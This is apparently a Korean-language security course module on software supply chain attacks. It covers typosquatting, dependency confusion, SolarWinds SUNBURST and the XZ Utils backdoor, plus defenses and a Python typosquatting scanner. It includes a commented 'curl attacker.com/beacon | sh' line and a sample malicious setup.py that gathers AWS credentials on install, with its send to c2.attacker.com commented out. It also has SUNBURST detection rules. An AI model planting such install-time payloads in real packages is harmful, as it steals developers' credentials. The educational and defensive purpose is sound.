> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 01 — 소프트웨어 공급망 공격

## 0. 초보자를 위한 개념 이해

### 소프트웨어 공급망 공격이란?

소프트웨어 공급망 공격(Software Supply Chain Attack)은 최종 제품이 아닌 그 제품을 만드는 과정(빌드 도구, 라이브러리, 패키지 저장소 등)을 침해해 배포 시점에 이미 악성 코드가 포함되도록 하는 공격이다. 사용자나 기업이 신뢰하는 패키지를 설치하는 순간 악성 코드가 실행되므로 탐지가 매우 어렵다. 2020년 SolarWinds, 2021년 Kaseya, 2024년 XZ Utils 등 대형 사건이 이 방식으로 발생했다.

**왜 배우는가:**
```
[공급망 공격의 파급력]

  개발자 → pip install malicious-package
               ↓
          악성 코드가 개발 환경 침해
               ↓
          빌드 서버에서 프로덕션 배포
               ↓
          최종 사용자 수만~수십만 명 피해

  [실제 사례 규모]
  SolarWinds: 18,000개 조직 동시 침해
  NPM 타이포스쿼팅: 매월 수천 건 발견
  PyPI 악성 패키지: 2023년 수백 개 발견
```

### 핵심 개념 정리

```
[공급망 공격 5가지 유형]

1. 타이포스쿼팅 (Typosquatting)
   - 오타 유도: requests → requets, numpy → nummpy
   - pip/npm 설치 시 오타로 악성 패키지 설치

2. 의존성 혼동 (Dependency Confusion)
   - 내부 패키지 이름을 공개 저장소에 높은 버전으로 등록
   - 패키지 관리자가 공개 저장소 버전 자동 선택

3. 계정 탈취 (Account Takeover)
   - 인기 패키지 관리자 계정 해킹 → 악성 버전 배포
   - 예: event-stream (npm, 2018)

4. 빌드 환경 침해 (Build Poisoning)
   - CI/CD 파이프라인 또는 빌드 서버 해킹
   - 컴파일 단계에서 악성 코드 삽입

5. 오픈소스 백도어 (Source Backdoor)
   - 장기간 기여자로 신뢰 획득 후 악성 코드 PR
   - 예: XZ Utils (CVE-2024-3094)
```

### 필요한 도구 및 환경
- **pip-audit**: Python 패키지 취약점 스캔
- **npm audit**: Node.js 의존성 보안 검사
- **SBOM 도구**: syft, cyclonedx로 소프트웨어 명세서 생성
- **OSV Scanner**: Google의 오픈소스 취약점 데이터베이스 스캐너

### 기초 실습 예제
```python
import subprocess
import json

def check_package_safety(package_name: str, ecosystem: str = "pypi") -> dict:
    """패키지 이름의 타이포스쿼팅 위험도와 알려진 취약점을 검사한다."""

    # 타이포스쿼팅 패턴 생성 (간단한 예시)
    def generate_typos(name: str) -> list[str]:
        typos = []
        for i in range(len(name)):
            # 문자 삭제
            typos.append(name[:i] + name[i+1:])
            # 인접 문자 교환
            if i < len(name) - 1:
                swapped = list(name)
                swapped[i], swapped[i+1] = swapped[i+1], swapped[i]
                typos.append(''.join(swapped))
        return list(set(t for t in typos if t != name and len(t) > 2))

    result = {
        "package": package_name,
        "ecosystem": ecosystem,
        "potential_typos": generate_typos(package_name)[:5],  # 상위 5개만
        "check_commands": [
            f"pip-audit -r requirements.txt",
            f"pip show {package_name}",
        ]
    }

    print(f"[*] {package_name} 유사 이름 (타이포스쿼팅 주의):")
    for typo in result["potential_typos"]:
        print(f"    - {typo}")

    print(f"\n[*] 취약점 검사 명령어:")
    print(f"    pip-audit --desc {package_name}")

    return result

# 사용 예시
# check_package_safety("requests")
# check_package_safety("numpy")
```

---

## 1. 패키지 저장소 공격

### 1-1. 타이포스쿼팅 (Typosquatting)

공격자는 개발자의 오타를 노려 합법적 패키지와 유사한 이름을 선점한다. pip install, npm install 과정에서 오타 한 글자로 악성 코드가 실행된다.

```bash
# 실제 발견된 타이포스쿼팅 사례 (npm)
# 정상: lodash         → 악성: lodahs, odash, l0dash
# 정상: express        → 악성: expres, expresss
# 정상: react          → 악성: reac, reeact, raect

# PyPI 타이포스쿼팅 사례
# 정상: requests       → 악성: requets, request, reqeusts
# 정상: boto3          → 악성: bot03, b0to3
# 정상: urllib3        → 악성: urlib3, urllib2, urrllib3
# 정상: setuptools     → 악성: setuptool, setup-tools

# 악성 패키지가 설치 시 실행하는 코드 패턴 (setup.py 내)
# os.system("curl attacker.com/beacon | sh")
# subprocess.run(["python3", "-c", "import socket; ..."])
```

타이포스쿼팅 패키지의 전형적인 `setup.py` 페이로드 구조:

```python
# 악성 setup.py 패턴 (분석 목적)
from setuptools import setup
import os
import socket
import platform

def exfil():
    """설치 시 자동 실행되는 데이터 유출 코드"""
    try:
        data = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "user": os.environ.get("USER", "unknown"),
            "home": os.path.expanduser("~"),
            # AWS 자격증명 탈취 시도
            "aws_key": os.environ.get("AWS_ACCESS_KEY_ID", ""),
            "aws_secret": os.environ.get("AWS_SECRET_ACCESS_KEY", ""),
        }
        # HTTP POST로 공격자 서버에 전송
        # requests.post("http://c2.attacker.com/collect", json=data)
    except Exception:
        pass

exfil()

setup(
    name="requets",  # 타이포스쿼팅
    version="2.28.1",  # 정상 버전과 동일하게 위장
    # ...
)
```

### 1-2. 의존성 혼동 (Dependency Confusion)

Alex Birsan이 2021년 공개한 공격 기법. 기업 내부 패키지 이름을 공개 저장소에 더 높은 버전 번호로 등록하면, pip/npm이 내부 저장소보다 공개 저장소를 우선 선택한다.

```bash
# 공격 시나리오
# 1. 내부 패키지 이름 수집 (package.json, requirements.txt에서)
# 2. 공개 PyPI/npm에 동일 이름으로 더 높은 버전 등록
# 3. 개발자가 pip install 시 내부 패키지 대신 악성 공개 패키지 설치

# 취약한 pip 설정 예시
# pip.conf에 extra-index-url만 설정한 경우
[global]
index-url = https://internal.company.com/simple/
extra-index-url = https://pypi.org/simple/
# 문제: extra-index-url은 폴백이 아닌 병렬 조회 → 버전 번호가 높은 쪽 선택

# 방어: --index-url만 사용하거나 패키지별 고정
pip install mypackage==1.0.0 --index-url https://internal.company.com/simple/

# npm 의존성 혼동 방어
# .npmrc에 scope 설정
@mycompany:registry=https://internal.company.com/npm/
```

### 1-3. 악성 계정 탈취 공격

```bash
# 실제 사례: event-stream (npm, 2018)
# - 인기 패키지 유지보수자가 새 기여자에게 권한 이양
# - 새 기여자가 flatmap-stream 의존성 추가 → Bitcoin 지갑 탈취 코드 포함

# PyPI 2FA 강제 적용 이후에도 세션 토큰 탈취 공격 지속
# 공격 흐름:
# 1. 유지보수자 피싱 → .pypirc 또는 API 토큰 탈취
# 2. pip 인증 토큰 환경변수 스니핑
# 3. CI/CD 환경에서 TWINE_PASSWORD 노출

# 탐지: 비정상 릴리즈 시간 (주말 심야, 유지보수자 비활동 기간)
# 탐지: 급격한 코드 변경 (작은 버전 bump에 대용량 변경)
```

---

## 2. SolarWinds 공격 벡터 상세 분석

### 2-1. 공격 타임라인

```
2019-10 : SolarWinds 빌드 서버 최초 침해 (정확한 경로 미확인)
2020-02 : SUNSPOT 악성코드가 빌드 서버에 설치됨
2020-03 : Orion 2019.4~2020.2.1 빌드에 SUNBURST 삽입 시작
2020-03 ~ 2020-12 : 배포된 업데이트를 통해 18,000개 조직 감염
2020-12-13 : FireEye가 SUNBURST 발견 및 공개
2020-12-14 : 미국 정부 공식 확인
2021-01 : SUNSPOT 분석 완료 — MsBuild.exe 프로세스 후킹으로 소스 삽입
```

### 2-2. SUNSPOT — 빌드 서버 임플란트

SUNSPOT은 MsBuild.exe 실행을 모니터링하다가 Orion 빌드를 감지하면 악성 소스 파일로 교체하는 방식으로 작동했다.

```csharp
// SUNSPOT이 수행한 소스 파일 교체 패턴 (재구성)
// 원본: SolarWinds.Orion.Core.BusinessLayer.dll 빌드 중
// SUNSPOT이 InventoryManager.cs 파일을 악성 버전으로 교체

// SUNBURST가 삽입된 클래스 (간략화)
namespace SolarWinds.Orion.Core.BusinessLayer {
    internal class OrionImprovementBusinessLayer {
        // 도메인 생성 알고리즘 (DGA) — C2 통신
        private static string GetOrionImprovementCustomerId() {
            // 피해자 식별자를 DGA로 인코딩하여 DNS 쿼리
            // avsvmcloud.com 도메인의 서브도메인으로 C2 통신
            // 예: 58k52dbg53.appsync-api.eu-west-1.avsvmcloud.com
        }
    }
}
```

### 2-3. SUNBURST C2 통신 메커니즘

```python
# SUNBURST C2 통신 패턴 분석 (방어 목적)
# DNS 기반 C2 — 정상 Orion 트래픽으로 위장

# SUNBURST가 사용한 도메인 생성 패턴
import hashlib
import base64

def analyze_sunburst_dga(victim_id: str) -> str:
    """
    SUNBURST DGA 패턴 재구성 (탐지 시그니처 개발 목적)
    실제 구현은 피해자 UID + 타임스탬프 기반 인코딩
    """
    # 피해자 식별자를 Base32로 인코딩하여 서브도메인 생성
    encoded = base64.b32encode(victim_id.encode()).decode().lower()
    return f"{encoded}.appsync-api.eu-west-1.avsvmcloud.com"

# SUNBURST 탐지 시그니처 (YARA)
SUNBURST_YARA = """
rule SUNBURST_BACKDOOR {
    meta:
        description = "SolarWinds SUNBURST backdoor detection"
    strings:
        $s1 = "avsvmcloud.com" ascii
        $s2 = "OrionImprovementBusinessLayer" ascii
        $s3 = "SolarWinds.Orion.Core.BusinessLayer" ascii
        $dga = /[a-z0-9]{15,32}\\.appsync-api\\.[a-z0-9-]+\\.avsvmcloud\\.com/
    condition:
        2 of them
}
"""

# 네트워크 탐지: avsvmcloud.com DNS 쿼리 모니터링
# Zeek/Suricata 시그니처
SURICATA_RULE = """
alert dns any any -> any 53 (
    msg:"SUNBURST C2 DNS lookup";
    dns.query;
    content:"avsvmcloud.com";
    nocase;
    sid:9000001;
    rev:1;
)
"""
```

### 2-4. 탐지 회피 기법

```
1. 긴 잠복 기간 (14일 이상 비활성 후 C2 활성화)
2. 정상 SolarWinds 코드 서명 인증서로 서명
3. Orion 관련 프로세스명/서비스명 사용
4. 분석 환경 탐지 (특정 도메인 조회, 프로세스 목록 확인)
5. DGA를 통한 C2 인프라 은닉
6. DNS C2로 방화벽 우회
```

---

## 3. XZ Utils CVE-2024-3094 상세 분석

### 3-1. 공격 타임라인

```
2021-10 : "Jia Tan" (JiaT75) 계정 생성, 첫 XZ 기여
2022-01 : 지속적인 소규모 기여로 신뢰 구축
2022-05 : 기존 유지보수자 "Lasse Collin"에게 co-maintainer 권한 요청
2023-03 : 5.4.0 릴리즈부터 실질적 메인테이너로 활동
2023-06 ~ 2024-02 : 백도어 삽입 코드를 단계별로 준비
2024-02-23 : 악성 빌드 스크립트가 포함된 5.6.0 릴리즈
2024-03-09 : 5.6.1 릴리즈 (백도어 난독화 개선)
2024-03-29 : Andres Freund (Microsoft)가 SSH 접속 지연 조사 중 발견
2024-03-29 : CVE-2024-3094 공개, 즉시 패치 배포
```

### 3-2. 백도어 삽입 메커니즘

```bash
# XZ Utils 백도어는 소스 코드가 아닌 빌드 스크립트에 삽입됨
# configure.ac와 Makefile.am이 테스트 파일에서 악성 오브젝트 추출

# 악성 파일 위치
# tests/files/bad-3-corrupt_lzma2.xz  — 악성 오브젝트 파일 포함
# tests/files/good-large_compressed.lzz — 추가 페이로드

# 빌드 과정에서의 악성 코드 추출 (configure.ac)
# if test "x$enable_sandbox" != xno && test -f /proc/version; then
#   # 테스트 파일에서 오브젝트를 추출하여 링크
# fi

# 백도어 효과
# - liblzma.so에 악성 코드 삽입
# - systemd가 liblzma를 통해 sshd에 링크
# - RSA 키 인증 과정에서 공격자 제어 코드 실행
# - 특정 RSA 공개키를 가진 공격자가 인증 없이 SSH 접근 가능

# 영향받은 배포판
# Fedora 40/41 (테스팅), Debian unstable/testing
# openSUSE Tumbleweed, Kali Linux, Arch Linux (일부 기간)
```

### 3-3. 사회공학적 신뢰 구축 전략

```
"Jia Tan"이 사용한 장기 침투 전략:

1. 품질 좋은 소규모 패치를 꾸준히 제출 (2년)
2. 이슈 트래커에서 도움을 주는 활동
3. 다른 프로젝트(libarchive, etc.)에도 기여하여 신뢰도 구축
4. 기존 유지보수자의 번아웃을 이용 (Lasse Collin의 개인 사정)
5. 가짜 사용자 계정("Jigar Kumar", "Dennis Ens")이 유지보수자 교체 압박
6. 단계별 권한 확대: contributor → co-maintainer → primary maintainer
```

### 3-4. 탐지 방법 (사후 분석)

```bash
# SSH 접속 지연 증상 (Andres Freund가 처음 발견)
# valgrind 오류와 함께 sshd CPU 사용률 급증

# 영향 확인
strings /usr/lib/x86_64-linux-gnu/liblzma.so.5 | grep -i "ssh"
# 정상: ssh 관련 문자열 없음
# 감염: N/A (코드는 난독화됨)

# 버전 확인
xz --version
# 5.6.0 또는 5.6.1이면 위험

# 실시간 탐지 (설치 중인 경우)
dpkg -l | grep liblzma
rpm -qa | grep xz-libs

# 패치 방법
sudo apt install --reinstall xz-utils  # Debian/Ubuntu
sudo dnf downgrade xz                  # Fedora
```

---

## 4. 악성 패키지 탐지 방법

### 4-1. SLSA (Supply-chain Levels for Software Artifacts)

```
SLSA 레벨:
L0: 보장 없음
L1: 빌드 프로세스 문서화, 빌드 완전성(provenance) 생성
L2: 빌드 서비스 사용, 서명된 provenance
L3: 강화된 빌드 서비스 (격리, 감사 로그)
L4: 두 당사자 검토, 밀폐된 빌드 환경 (미래 목표)

실무 적용:
- GitHub Actions에서 SLSA provenance 자동 생성
- slsa-github-generator 사용
```

```yaml
# .github/workflows/slsa.yml — SLSA L3 provenance 생성
name: SLSA Provenance
on:
  release:
    types: [created]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      digests: ${{ steps.hash.outputs.digests }}
    steps:
      - uses: actions/checkout@v4
      - name: Build artifacts
        run: make build
      - name: Generate hash
        id: hash
        run: |
          sha256sum dist/* | base64 -w0 > digests
          echo "digests=$(cat digests)" >> $GITHUB_OUTPUT

  provenance:
    needs: [build]
    permissions:
      actions: read
      id-token: write
      contents: write
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.10.0
    with:
      base64-subjects: ${{ needs.build.outputs.digests }}
```

### 4-2. Sigstore — 코드 서명

```bash
# cosign으로 컨테이너 이미지 서명
cosign sign --key cosign.key gcr.io/myproject/myimage:latest

# 서명 검증
cosign verify --key cosign.pub gcr.io/myproject/myimage:latest

# keyless 서명 (OIDC 기반)
COSIGN_EXPERIMENTAL=1 cosign sign gcr.io/myproject/myimage:latest

# Python 패키지 서명 (sigstore-python)
pip install sigstore
python -m sigstore sign dist/mypackage-1.0.0.tar.gz
python -m sigstore verify identity \
  --bundle dist/mypackage-1.0.0.tar.gz.sigstore \
  --certificate-identity user@example.com \
  --certificate-oidc-issuer https://accounts.google.com \
  dist/mypackage-1.0.0.tar.gz
```

### 4-3. in-toto — 공급망 전 단계 무결성

```python
# in-toto link 메타데이터 생성 예시
from in_toto import runlib

# 각 빌드 단계에서 link 파일 생성
runlib.in_toto_run(
    name="build",
    link_signing_keyid="developer_key",
    material_list=["src/"],
    product_list=["dist/"],
    run=["make", "build"],
    signing_keyids=["developer_key"],
    gpg_keyid=None,
)

# 검증 (배포 환경에서)
from in_toto import verifylib
verifylib.in_toto_verify("root.layout", ["vendor_key"])
```

---

## 5. Python 도구 — PyPI/npm 타이포스쿼팅 스캐너

```python
#!/usr/bin/env python3
"""
supply_chain_scanner.py — PyPI/npm 패키지 타이포스쿼팅 스캐너

사용법:
    python supply_chain_scanner.py pypi --package requests --top 100
    python supply_chain_scanner.py npm --package lodash --output report.json
    python supply_chain_scanner.py batch --file requirements.txt --workers 20
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import hashlib
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Iterator
from urllib.parse import quote

import httpx


# ── 상수 ──────────────────────────────────────────────────────────────────────

PYPI_API = "https://pypi.org/pypi/{package}/json"
NPM_API  = "https://registry.npmjs.org/{package}"
PYPI_SIMPLE = "https://pypi.org/simple/"
REQUEST_TIMEOUT = 15.0
MAX_RETRIES = 3


# ── 데이터 클래스 ──────────────────────────────────────────────────────────────

@dataclass
class PackageInfo:
    name: str
    version: str
    registry: str
    author: str
    author_email: str
    upload_time: str
    description: str
    download_url: str
    is_suspicious: bool = False
    suspicion_reasons: list[str] = field(default_factory=list)
    similarity_score: float = 0.0
    target_package: str = ""


@dataclass
class ScanResult:
    target: str
    registry: str
    typosquats_found: list[PackageInfo]
    scan_duration_sec: float
    candidates_checked: int
    error: str = ""


# ── 타이포스쿼팅 변형 생성기 ──────────────────────────────────────────────────

class TypoGenerator:
    """패키지 이름에서 타이포스쿼팅 후보를 생성한다."""

    def __init__(self, name: str) -> None:
        self.name = name.lower()

    def omission(self) -> Iterator[str]:
        """문자 한 개 제거"""
        for i in range(len(self.name)):
            yield self.name[:i] + self.name[i+1:]

    def insertion(self) -> Iterator[str]:
        """키보드 인접 문자 삽입"""
        # QWERTY 인접 키 매핑
        adjacent: dict[str, str] = {
            'a': 'sqwz', 'b': 'vghn', 'c': 'xdfv', 'd': 'serfcx',
            'e': 'wsdr', 'f': 'drtgvc', 'g': 'ftyhbv', 'h': 'gyujnb',
            'i': 'ujko', 'j': 'huikmn', 'k': 'jiolm', 'l': 'kop',
            'm': 'njk', 'n': 'bhjm', 'o': 'iklp', 'p': 'ol',
            'q': 'wa', 'r': 'edft', 's': 'awedxz', 't': 'rfgy',
            'u': 'yhji', 'v': 'cfgb', 'w': 'qase', 'x': 'zsdc',
            'y': 'tghu', 'z': 'asx',
        }
        for i, c in enumerate(self.name):
            for neighbor in adjacent.get(c, ''):
                yield self.name[:i] + neighbor + self.name[i:]

    def substitution(self) -> Iterator[str]:
        """문자 한 개 치환"""
        adjacent: dict[str, str] = {
            'a': 'sqwz', 'b': 'vghn', 'c': 'xdfv', 'd': 'serfcx',
            'e': 'wsdr', 'f': 'drtgvc', 'g': 'ftyhbv', 'h': 'gyujnb',
            'i': 'ujko', 'j': 'huikmn', 'k': 'jiolm', 'l': 'kop',
            'm': 'njk', 'n': 'bhjm', 'o': 'iklp', 'p': 'ol',
            'q': 'wa', 'r': 'edft', 's': 'awedxz', 't': 'rfgy',
            'u': 'yhji', 'v': 'cfgb', 'w': 'qase', 'x': 'zsdc',
            'y': 'tghu', 'z': 'asx',
        }
        for i, c in enumerate(self.name):
            for sub in adjacent.get(c, ''):
                if sub != c:
                    yield self.name[:i] + sub + self.name[i+1:]

    def transposition(self) -> Iterator[str]:
        """인접 문자 교환"""
        for i in range(len(self.name) - 1):
            yield (self.name[:i] + self.name[i+1] +
                   self.name[i] + self.name[i+2:])

    def hyphen_underscore(self) -> Iterator[str]:
        """하이픈-언더스코어 혼동"""
        if '-' in self.name:
            yield self.name.replace('-', '_')
        if '_' in self.name:
            yield self.name.replace('_', '-')

    def double_letter(self) -> Iterator[str]:
        """문자 중복"""
        for i, c in enumerate(self.name):
            yield self.name[:i] + c + c + self.name[i+1:]

    def all_variants(self) -> set[str]:
        """모든 변형 후보를 반환 (원본 제외)"""
        variants: set[str] = set()
        for method in (
            self.omission, self.insertion, self.substitution,
            self.transposition, self.hyphen_underscore, self.double_letter,
        ):
            variants.update(method())
        variants.discard(self.name)
        return variants


# ── Levenshtein 유사도 ────────────────────────────────────────────────────────

def levenshtein_distance(a: str, b: str) -> int:
    """편집 거리 계산"""
    if len(a) < len(b):
        return levenshtein_distance(b, a)
    if not b:
        return len(a)
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a):
        curr = [i + 1]
        for j, cb in enumerate(b):
            ins = prev[j + 1] + 1
            del_ = curr[j] + 1
            sub = prev[j] + (ca != cb)
            curr.append(min(ins, del_, sub))
        prev = curr
    return prev[-1]


def similarity_score(a: str, b: str) -> float:
    """0.0~1.0 유사도 (1.0 = 동일)"""
    dist = levenshtein_distance(a.lower(), b.lower())
    max_len = max(len(a), len(b))
    return 1.0 - dist / max_len if max_len > 0 else 1.0


# ── PyPI 클라이언트 ───────────────────────────────────────────────────────────

class PyPIClient:
    def __init__(self, client: httpx.Client) -> None:
        self.client = client

    def get_package_info(self, package: str) -> PackageInfo | None:
        url = PYPI_API.format(package=quote(package))
        for attempt in range(MAX_RETRIES):
            try:
                resp = self.client.get(url, timeout=REQUEST_TIMEOUT)
                if resp.status_code == 404:
                    return None
                resp.raise_for_status()
                data = resp.json()
                info = data["info"]
                releases = data.get("releases", {})
                latest_ver = info.get("version", "")
                upload_time = ""
                if latest_ver in releases and releases[latest_ver]:
                    upload_time = releases[latest_ver][0].get("upload_time", "")
                return PackageInfo(
                    name=info.get("name", package),
                    version=latest_ver,
                    registry="pypi",
                    author=info.get("author", ""),
                    author_email=info.get("author_email", ""),
                    upload_time=upload_time,
                    description=info.get("summary", "")[:200],
                    download_url=info.get("project_url", ""),
                )
            except httpx.HTTPStatusError:
                return None
            except (httpx.RequestError, json.JSONDecodeError):
                if attempt < MAX_RETRIES - 1:
                    time.sleep(1.0 * (attempt + 1))
                    continue
                return None
        return None

    def package_exists(self, package: str) -> bool:
        return self.get_package_info(package) is not None


# ── npm 클라이언트 ────────────────────────────────────────────────────────────

class NpmClient:
    def __init__(self, client: httpx.Client) -> None:
        self.client = client

    def get_package_info(self, package: str) -> PackageInfo | None:
        url = NPM_API.format(package=quote(package))
        for attempt in range(MAX_RETRIES):
            try:
                resp = self.client.get(url, timeout=REQUEST_TIMEOUT)
                if resp.status_code == 404:
                    return None
                resp.raise_for_status()
                data = resp.json()
                latest_ver = data.get("dist-tags", {}).get("latest", "")
                version_data = data.get("versions", {}).get(latest_ver, {})
                time_data = data.get("time", {})
                upload_time = time_data.get(latest_ver, "")
                author_info = version_data.get("author", {})
                if isinstance(author_info, str):
                    author_name = author_info
                    author_email = ""
                else:
                    author_name = author_info.get("name", "")
                    author_email = author_info.get("email", "")
                return PackageInfo(
                    name=data.get("name", package),
                    version=latest_ver,
                    registry="npm",
                    author=author_name,
                    author_email=author_email,
                    upload_time=upload_time,
                    description=data.get("description", "")[:200],
                    download_url=f"https://www.npmjs.com/package/{package}",
                )
            except httpx.HTTPStatusError:
                return None
            except (httpx.RequestError, json.JSONDecodeError):
                if attempt < MAX_RETRIES - 1:
                    time.sleep(1.0 * (attempt + 1))
                    continue
                return None
        return None


# ── 의심 패키지 분석기 ────────────────────────────────────────────────────────

class SuspicionAnalyzer:
    """패키지 정보를 분석하여 의심 지표를 탐지한다."""

    # 의심스러운 설명 패턴
    SUSPICIOUS_DESC_PATTERNS = [
        r'test\s+package',
        r'placeholder',
        r'reserved',
        r'do\s+not\s+use',
        r'typo.*fix',
    ]

    def analyze(
        self,
        pkg: PackageInfo,
        target: str,
        target_info: PackageInfo | None,
    ) -> PackageInfo:
        reasons: list[str] = []
        score = similarity_score(pkg.name, target)
        pkg.similarity_score = score
        pkg.target_package = target

        # 높은 유사도
        if score >= 0.85:
            reasons.append(f"높은 이름 유사도: {score:.2f}")

        # 타겟과 동일 저자
        if (target_info and pkg.author and target_info.author and
                pkg.author.lower() == target_info.author.lower()):
            reasons.append("타겟과 동일 저자 (정상 패키지일 수 있음)")

        # 빈 설명
        if not pkg.description or len(pkg.description) < 10:
            reasons.append("설명이 없거나 매우 짧음")

        # 의심스러운 설명
        for pattern in self.SUSPICIOUS_DESC_PATTERNS:
            if re.search(pattern, pkg.description, re.IGNORECASE):
                reasons.append(f"의심 설명 패턴: {pattern}")
                break

        # 최근 생성 (30일 이내)
        if pkg.upload_time:
            try:
                from datetime import datetime, timezone
                upload = datetime.fromisoformat(
                    pkg.upload_time.replace('Z', '+00:00')
                )
                age_days = (datetime.now(timezone.utc) - upload).days
                if age_days < 30:
                    reasons.append(f"최근 등록: {age_days}일 전")
            except ValueError:
                pass

        # 버전 0.x (아직 개발 중 위장)
        if pkg.version.startswith("0."):
            reasons.append("버전 0.x — 미성숙 패키지")

        pkg.is_suspicious = len(reasons) > 0
        pkg.suspicion_reasons = reasons
        return pkg


# ── 스캐너 코어 ───────────────────────────────────────────────────────────────

class SupplyChainScanner:
    def __init__(self, workers: int = 10) -> None:
        self.workers = workers
        self.http_client = httpx.Client(
            headers={"User-Agent": "supply-chain-scanner/1.0"},
            follow_redirects=True,
        )
        self.pypi = PyPIClient(self.http_client)
        self.npm = NpmClient(self.http_client)
        self.analyzer = SuspicionAnalyzer()

    def close(self) -> None:
        self.http_client.close()

    def __enter__(self) -> "SupplyChainScanner":
        return self

    def __exit__(self, *_: object) -> None:
        self.close()

    def scan_pypi(self, package: str) -> ScanResult:
        start = time.monotonic()
        target_info = self.pypi.get_package_info(package)

        generator = TypoGenerator(package)
        variants = generator.all_variants()
        typosquats: list[PackageInfo] = []

        def check_variant(variant: str) -> PackageInfo | None:
            pkg_info = self.pypi.get_package_info(variant)
            if pkg_info is None:
                return None
            return self.analyzer.analyze(pkg_info, package, target_info)

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = {
                executor.submit(check_variant, v): v for v in variants
            }
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    typosquats.append(result)

        # 유사도 높은 순 정렬
        typosquats.sort(key=lambda x: x.similarity_score, reverse=True)

        return ScanResult(
            target=package,
            registry="pypi",
            typosquats_found=typosquats,
            scan_duration_sec=time.monotonic() - start,
            candidates_checked=len(variants),
        )

    def scan_npm(self, package: str) -> ScanResult:
        start = time.monotonic()
        target_info = self.npm.get_package_info(package)

        generator = TypoGenerator(package)
        variants = generator.all_variants()
        typosquats: list[PackageInfo] = []

        def check_variant(variant: str) -> PackageInfo | None:
            pkg_info = self.npm.get_package_info(variant)
            if pkg_info is None:
                return None
            return self.analyzer.analyze(pkg_info, package, target_info)

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = {
                executor.submit(check_variant, v): v for v in variants
            }
            for future in as_completed(futures):
                result = future.result()
                if result is not None:
                    typosquats.append(result)

        typosquats.sort(key=lambda x: x.similarity_score, reverse=True)

        return ScanResult(
            target=package,
            registry="npm",
            typosquats_found=typosquats,
            scan_duration_sec=time.monotonic() - start,
            candidates_checked=len(variants),
        )

    def scan_requirements_file(
        self,
        path: Path,
        registry: str,
        workers: int,
    ) -> list[ScanResult]:
        packages = self._parse_requirements(path, registry)
        results: list[ScanResult] = []

        with ThreadPoolExecutor(max_workers=workers) as executor:
            if registry == "pypi":
                futures = {
                    executor.submit(self.scan_pypi, pkg): pkg
                    for pkg in packages
                }
            else:
                futures = {
                    executor.submit(self.scan_npm, pkg): pkg
                    for pkg in packages
                }
            for future in as_completed(futures):
                results.append(future.result())

        return results

    @staticmethod
    def _parse_requirements(path: Path, registry: str) -> list[str]:
        packages: list[str] = []
        text = path.read_text(encoding="utf-8")

        if registry == "pypi":
            # requirements.txt 파싱
            for line in text.splitlines():
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                # 버전 제거
                pkg = re.split(r'[>=<!;\[,\s]', line)[0]
                if pkg:
                    packages.append(pkg)
        else:
            # package.json 파싱
            try:
                data = json.loads(text)
                deps = {}
                deps.update(data.get("dependencies", {}))
                deps.update(data.get("devDependencies", {}))
                packages = list(deps.keys())
            except json.JSONDecodeError:
                # 줄 단위 파싱 시도
                for line in text.splitlines():
                    line = line.strip().strip('"').strip("'").rstrip(',')
                    if line and not line.startswith(("#", "//")):
                        packages.append(line)

        return packages


# ── 출력 포맷터 ───────────────────────────────────────────────────────────────

class OutputFormatter:
    @staticmethod
    def print_result(result: ScanResult) -> None:
        print(f"\n{'='*60}")
        print(f"타겟 패키지: {result.target} ({result.registry.upper()})")
        print(f"검사한 변형: {result.candidates_checked}개")
        print(f"소요 시간: {result.scan_duration_sec:.2f}초")

        if result.error:
            print(f"오류: {result.error}")
            return

        found = result.typosquats_found
        print(f"발견된 유사 패키지: {len(found)}개")

        suspicious = [p for p in found if p.is_suspicious]
        if suspicious:
            print(f"\n[경고] 의심 패키지 {len(suspicious)}개:")
            for pkg in suspicious:
                print(f"  - {pkg.name} (v{pkg.version})")
                print(f"    유사도: {pkg.similarity_score:.2f}")
                print(f"    저자: {pkg.author} <{pkg.author_email}>")
                for reason in pkg.suspicion_reasons:
                    print(f"    * {reason}")
        else:
            print("의심 패키지 없음")

    @staticmethod
    def to_json(results: list[ScanResult]) -> str:
        data = []
        for r in results:
            item = {
                "target": r.target,
                "registry": r.registry,
                "candidates_checked": r.candidates_checked,
                "scan_duration_sec": round(r.scan_duration_sec, 3),
                "typosquats": [asdict(p) for p in r.typosquats_found],
                "suspicious_count": sum(
                    1 for p in r.typosquats_found if p.is_suspicious
                ),
            }
            data.append(item)
        return json.dumps(data, ensure_ascii=False, indent=2)


# ── CLI ───────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="supply_chain_scanner",
        description="PyPI/npm 패키지 타이포스쿼팅 스캐너",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  # PyPI 단일 패키지 스캔
  python supply_chain_scanner.py pypi --package requests

  # npm 패키지 스캔 후 JSON 저장
  python supply_chain_scanner.py npm --package lodash --output result.json

  # requirements.txt 일괄 스캔
  python supply_chain_scanner.py batch --file requirements.txt \\
    --registry pypi --workers 15

  # package.json 일괄 스캔
  python supply_chain_scanner.py batch --file package.json \\
    --registry npm --output npm_report.json
        """,
    )

    sub = parser.add_subparsers(dest="command", required=True)

    # pypi 서브커맨드
    pypi_p = sub.add_parser("pypi", help="PyPI 패키지 스캔")
    pypi_p.add_argument("--package", required=True, help="스캔할 패키지 이름")
    pypi_p.add_argument("--workers", type=int, default=10, help="병렬 워커 수")
    pypi_p.add_argument("--output", help="JSON 결과 파일 경로")
    pypi_p.add_argument("--all", action="store_true",
                        help="의심 여부 무관하게 모든 결과 출력")

    # npm 서브커맨드
    npm_p = sub.add_parser("npm", help="npm 패키지 스캔")
    npm_p.add_argument("--package", required=True, help="스캔할 패키지 이름")
    npm_p.add_argument("--workers", type=int, default=10, help="병렬 워커 수")
    npm_p.add_argument("--output", help="JSON 결과 파일 경로")

    # batch 서브커맨드
    batch_p = sub.add_parser("batch", help="requirements.txt/package.json 일괄 스캔")
